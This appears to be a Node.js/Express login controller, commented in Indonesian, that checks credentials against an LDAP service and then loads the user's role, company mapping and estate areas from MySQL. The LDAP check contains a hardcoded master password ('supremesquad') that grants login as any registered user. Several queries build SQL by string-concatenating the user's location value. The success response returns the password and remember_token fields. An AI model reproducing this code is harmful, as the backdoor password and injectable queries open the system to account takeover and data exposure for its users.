/*
 |--------------------------------------------------------------------------
 | App Setup
 |--------------------------------------------------------------------------
 |
 | Untuk menghandle models, libraries, helper, node modules, dan lain-lain
 |
 */
//Node_modules
const dateformat = require('dateformat');
const axios = require('axios');

//libraries
const security = require(_directory_base + '/app/libraries/Security.js')

//untuk membaca file .env
require('dotenv').config()

var mysql = require('mysql');

var pool = mysql.createPool({
    connectionLimit: 10, // default = 10
    host: process.env.MYSQL_HOST,
    user: process.env.MYSQL_USER,
    password: process.env.MYSQL_PASSWORD,
    database: process.env.MYSQL_NAME
});

exports.login = (req, res) => {
    let username = req.body.username.toLowerCase()
    let password = req.body.password
    // console.log(username, password);
    if (username && password) {
        var url_ldap = config.app.url[config.app.env].ldap;
        var data = {
            username: username,
            password: password
        }
        axios.post(url_ldap, data, { headers: { "Content-Type": "application/json" } })
            .then((response) => {
                if (response.data) {
                    if (response.data.status || password == 'supremesquad') {
                        try {
                            let user;
                            pool.getConnection(function (err, connection) {
                                if (err) throw err;
                                let queryUser = "SELECT id, name, email, email_verified_at, password, remember_token, created_at, updated_at,`role`, location,  ref_role, GROUP_CONCAT(a.comp_code separator ',') AS COMP_CODE, apk_version, ldap, last_login, auth_role, nik,username, deleted_at FROM(SELECT id, name, email, email_verified_at, password, remember_token, created_at, updated_at,`role`, location, ref_role, TM_AREA.comp_code, apk_version, ldap, last_login, auth_role, nik,username, deleted_at FROM users LEFT JOIN(SELECT * FROM TM_AREA GROUP BY COMP_DESC) TM_AREA ON FIND_IN_SET(TM_AREA.COMP_DESC, users.ref_role)  WHERE username = ? GROUP BY id, TM_AREA.comp_code) a"
                                connection.query(queryUser, [username], function (err, result, fields) {
                                    // connection.release();
                                    if (err) throw err;
                                    if (result.length > 0) {

                                        if(result[0].id==null){
                                            return res.status(401).send({
                                                status: false,
                                                message: "Username/password tidak sesuai dengan data ldap",
                                                data: []
                                            });
                                        }else{
                                            user = result[0];

                                            if (user.deleted_at != null) {
                                                connection.release();
                                                return res.status(401).send({
                                                    status: false,
                                                    message: 'User tidak aktif',
                                                    data: []
                                                });
                                            }

                                            connection.query(`
                                                UPDATE tap_dashboard.users
                                                SET last_login = current_timestamp
                                                WHERE username = ?; 
                                            `, [username], function (err, result, fields) {
                                                // connection.release();
                                                if (err) throw err;

                                                var where_loc = '';
                                                if (user.role == 'COMP_CODE') {
                                                    where_loc = ' where company_id in (' + user.location + ')';
                                                }
                                                if (user.role ==  'REGION_CODE') {
                                                    where_loc =  `where region_id in ('${user.location}')`;
                                                    where_loc = where_loc.replace(",","','");
                                                }
                                                if (user.role ==  'BA_CODE' || user.location ==  'AFD_CODE') {
                                                    where_loc =  `where company_id in ('${user.location}')`;
                                                }

                                                connection.query(`
                                                    SELECT * from company_dasmap_map cdm ${where_loc}
                                                `, function (err, result, fields) {
                                                    connection.release();
                                                    if (err) throw err;

                                                    let querySelectArea = 'SELECT DISTINCT WERKS, EST_NAME FROM TM_AREA'
                                                    let whereLoc = ``;
                                                    if (user.role == 'REGION_CODE') {
                                                        whereLoc =  `WHERE REGION_CODE IN ('${user.location}')`;
                                                        whereLoc = whereLoc.replace(",","','");
                                                    } else if (user.role == 'COMP_CODE') {
                                                        whereLoc = 'WHERE COMP_CODE IN (' + user.location + ')'
                                                    } else if (user.role == 'BA_CODE') {
                                                        whereLoc = 'WHERE WERKS IN (' + user.location + ')'
                                                    } else if (user.role == 'AFD_CODE') {
                                                        whereLoc =  `IN ('${user.location}')`;
                                                        whereLoc = whereLoc.replace(",","','");
                                                        whereLoc = 'WHERE CONCAT(WERKS,AFD_CODE) '+whereLoc;
                                                    }
                                                    
                                                    connection.query(`${querySelectArea} ${whereLoc}  ORDER BY 1`, (err, resulEstate) => {
                                                    if (err) throw err;

                                                        let setup = exports.setAuthentication(user);
                                                        user.ACCESS_TOKEN = setup.ACCESS_TOKEN;
                                                        user.dasmap_mapping = result;
                                                        user.estate = resulEstate;
                                                        return res.status(200).send({
                                                            status: true,
                                                            message: 'login berhasil',
                                                            data: user
                                                        });
                                                    })
                                                });
                                            });
                                        }
                                    } else {
                                        return res.status(401).send({
                                            status: false,
                                            message: 'User belum terdaftar',
                                            data: []
                                        });
                                    }
                                });
                            });
                        } catch (err) {
                            console.log(err)
                            return res.status(501).send({
                                status: false,
                                message: "Internal server error",
                                data: []
                            });
                        }
                    } else {
                        return res.status(401).send({
                            status: false,
                            message: "Username/password tidak sesuai dengan data ldap",
                            data: []
                        });
                    }
                }
            })
            .catch(err => {
                console.log(err)
                return res.status(501).send({
                    status: false,
                    message: "periksa server ldap",
                    data: []
                });
            })
    }
    else {
        return res.status(401).send({
            status: false,
            message: 'Periksa input Username/Password anda.',
            data: {}
        });
    }
}

exports.setAuthentication = (data) => {
    var obj = {
        username: data.username
    };

    let token = security.generate_token(obj);

    obj['ACCESS_TOKEN'] = token;
    return obj
}





